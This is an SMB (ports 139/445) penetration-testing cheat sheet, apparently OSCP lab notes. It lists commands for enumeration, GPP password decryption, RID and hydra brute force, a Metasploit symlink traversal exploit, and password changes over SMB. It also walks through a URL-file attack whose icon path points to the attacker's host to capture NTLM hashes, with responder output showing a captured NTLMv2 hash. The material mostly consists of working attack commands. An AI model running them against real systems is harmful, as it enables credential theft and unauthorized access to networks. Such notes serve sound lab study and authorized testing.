# 139,445 (SMB)

## Enumeration

### smbmap

```bash
smbmap -H <IP>
smbmap -H <IP> -u anonymous
smbmap -H <IP> -u '' -p ''
smbmap -H <IP> -u 'guest' -p ''
smbmap -R <share> -H <IP>  # List out directories and their contents
# Look for things like Groups.xml for AD
smbmap -R <share> -H <IP> -A Groups.xml -q  # Attempt to download file
# Locate cpasword= in Groups.xml and decrypt it
gpp-decrypt <cpassword>
```

### smbclient

```bash
smbclient -L //<IP>  # List out available shares
smbclient -L //<IP>/ -U <username>
smbclient //<IP>/<SHARE>  # Connect to an available share

# Forcing Protol NT1
smbclient -L //<IP>/ --option='client min protocol=NT1'
smbclient //<IP>/<SHARE> --option='client min protocol=NT1'

```

#### Commands

```bash
dir /a
smb: \> mask "*"
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### crackmapexec

```bash
crackmapexec smb <IP>
crackmapexec smb <IP> 'guest' -p ''
crackmapexec smb <IP> --shares
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> --shares -u <username> -p <password>
crackmapexec smb <IP> --pass-pol
crackmapexec smb <IP> --users
crackmapexec smb <IP> -u 'a' -p '' --rid-brute

crackmapexec winrm <IP> --shares -u <username> -p <password>  # Tell us if we can get on the machine
# Look for Pwn3d!
evil-winrm -i <IP> -u <username> -p <password>
```

### rpcclient

```bash
rpcclient <IP>
rpcclient -U ''
<TAB> <TAB>  # Show options when connected
> enumdomusers
```

### nbtscan

```bash
nbtscan <IP>
```

### enum4linux

```bash
enum4linux <IP>
```

### samrdump

```bash
python3 /usr/share/doc/python3-impacket/examples/samrdump.py <IP>
```

### nmap

```bash
# /usr/share/nmap/scripts/smb*
nmap -p445 <IP> --script=smb-system-info
nmap -p445 <IP> --script=smb-enum*
nmap -p445 <IP> --script=smb-vuln*
```

### Metasploit

```bash
search smb
```

## Brute Force

```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusernam
hydra -l Administrator -P /usr/share/seclists/Passwords/darkweb2017-top100.txt <IP> smb -V -f
hydra -L usernames.txt -P passwords.txt <IP> smb -V -f
```

## Exploitation Check

* [ ] Enumerate and download any interesting files ideally looking for credentials or other information relating to other services.
* [ ] Can you login via SMB and put files on the system?
  * [ ] If so, is there a web interface where you can access the files?
    * [ ] If so, then you may be able to upload a reverse shell.
  * [ ] If so, can you use Metasploit to create symbolic link to the root filesystem?

## Exploitation

### Metasploit

```bash
use auxiliary/admin/smb/samba_symlink_traversal
set rhost
set smbshare <SHARE>
exploit
```

Then back in `smbclient` we can `cd` into the `rootfs` that was created.

### SMB Password Change

```bash
# Attempt to change a users password through SMB
smbpasswd -U <username> -r <IP>
# Then can use crackmapexec to test login
cme smb <IP> -u <username> -p <password>
cme winrm <IP> -u <username> -p <password>
```

### SMB Drive Mapping

```bash
sudo mount -t cifs -o 'user=<username>,password=<password>' //IP/Share /mnt/dir
# Go into /mnt/dir to look for interesting files
```

### URI File Attack

If the target is a Windows host and the SMB Share can be written to, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allows us to capture the user's NTLM hash when it is accessed.

Create a file named @hax.url with the following contents

{% code title="@hax.url" %}
```bash
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<KALI IP>\%USERNAME%.icon
IconIndex=1
```
{% endcode %}

Start responder to list for the request:

```bash
sudo responder -I tap0 -v
```

Upload the file to the SMB share:

```bash
kali@kali:~/Documents/offsec/oscp/proving_grounds/Vault$ smbclient //192.168.71.172/DocumentsShare
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put @hax.url 
putting file @hax.url as \@hax.url (0.4 kb/s) (average 0.4 kb/s)
```

Responder Output:

{% code overflow="wrap" %}
```bash
[SMB] NTLMv2-SSP Client   : 192.168.71.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:a07bde1e074e8ce7:7E005501CA1DA9CF07F1685B766EDFF3:010100000000000000190681B8C7D801B6D4A008DAA2A3E00000000002000800450038004800570001001E00570049004E002D00480053003200380043005100560038004C005900440004003400570049004E002D00480053003200380043005100560038004C00590044002E0045003800480057002E004C004F00430041004C000300140045003800480057002E004C004F00430041004C000500140045003800480057002E004C004F00430041004C000700080000190681B8C7D801060004000200000008003000300000000000000001000000002000001B898DAC5A5D0D98431AE6A160F57301D980DD48CBD559755DCD4AF5BE07242D0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00370031000000000000000000
```
{% endcode %}



